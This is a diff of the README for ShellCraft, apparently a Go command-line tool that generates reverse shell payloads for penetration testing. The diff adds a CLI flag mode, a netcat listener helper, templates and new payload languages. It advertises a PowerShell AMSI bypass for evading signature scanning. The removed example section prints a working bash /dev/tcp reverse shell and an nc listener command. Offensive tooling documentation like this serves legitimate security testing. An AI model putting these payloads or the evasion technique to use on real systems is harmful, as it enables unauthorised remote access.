@@ -8,17 +8,15 @@ ShellCraft is a standalone, interactive CLI tool written in Go for generating lo
 
 ## Features
 
-- **Interactive Workflow:** Guides you through inputting the attacker IP and port.
+- **Multi-Mode Generation:** Use the interactive guided workflow or quick CLI flags for one-liner generation.
+- **Listener Helper:** Quickly start a netcat listener with the `listen` subcommand.
+- **Template System:** Save and load custom payload configurations to speed up your workflow.
 - **Clipboard Support:** Copy generated payloads directly to your clipboard with one click.
-- **Multiple Payloads:**
-  - **Linux Bash:** Standard bash reverse shell.
-  - **Linux/macOS NC FIFO:** Netcat-based shell using a named pipe.
-  - **Windows PowerShell (AMSI Bypass):** A fragmented PowerShell payload to bypass basic static signature scanning.
-  - **macOS Zsh Native:** Native Zsh reverse shell using `ztcp`.
-- **Encoding & Wrappers:**
-  - **Raw:** Plaintext payload.
-  - **URL Encoded:** For web-based delivery.
-  - **Base64/Pipeline:** Wrapped in `echo | base64 -d | sh`.
+- **Expanded Payload Library:**
+  - **Linux:** Bash, NC FIFO, Python, PHP, Ruby, Perl.
+  - **Windows:** PowerShell (AMSI Bypass).
+  - **macOS:** Zsh Native.
+- **Encoding & Wrappers:** Raw, URL Encoded, and Base64/Pipeline.
 - **Zero External Dependencies:** Built entirely with the Go standard library.
 - **Clean Exit:** Gracefully handles `Ctrl+C`.
 
@@ -41,13 +39,13 @@ Run the following command to download and run the installer:
 curl -sSL https://raw.githubusercontent.com/MKMithun2806/ShellCraft/main/install.sh | bash
 ```
 
-### Option 2: Using go install
+### Option 3: Using go install
 
 ```bash
 go install github.com/MKMithun2806/ShellCraft@latest
 ```
 
-### Option 3: Manual Build
+### Option 4: Manual Build
 
 1. Clone the repository:
    ```bash
@@ -59,33 +57,34 @@ go install github.com/MKMithun2806/ShellCraft@latest
    go build -ldflags "-X main.Version=1.0.0" -o shellcraft ./cmd/shellcraft
    ```
 
-
 ## Usage
 
-Run the tool:
+### Interactive Mode
+Simply run the tool and follow the prompts:
 ```bash
 shellcraft
 ```
 
-### Example
-
-1. **Input IP:** `10.10.10.10`
-2. **Input Port:** `4444`
-3. **Select Payload:** `Linux Bash`
-4. **Select Wrapper:** `Raw`
-
-**Expected Output:**
-```text
-============================================================
-[+] Listener Command:
-    nc -lvnp 4444
-
-[+] Finalized Payload (Linux Bash - Raw):
-
-bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
-
-============================================================
+### One-liner Mode (Non-interactive)
+Generate payloads instantly using CLI flags:
+```bash
+shellcraft -i 10.10.10.10 -p 4444 -t python -e base64
 ```
+
+**Flags:**
+- `-i`: Attacker IP
+- `-p`: Attacker Port
+- `-t`: Payload Type (bash, nc, ps, zsh, python, php, ruby, perl)
+- `-e`: Encoding (raw, url, base64)
+
+### Listener Helper
+Quickly start a netcat listener:
+```bash
+shellcraft listen 4444
+```
+
+### Template System
+After generating a payload in interactive mode, select **"Save as Template"**. The tool will prompt you to load saved templates the next time you run it interactively.
 
 ## Uninstallation
 
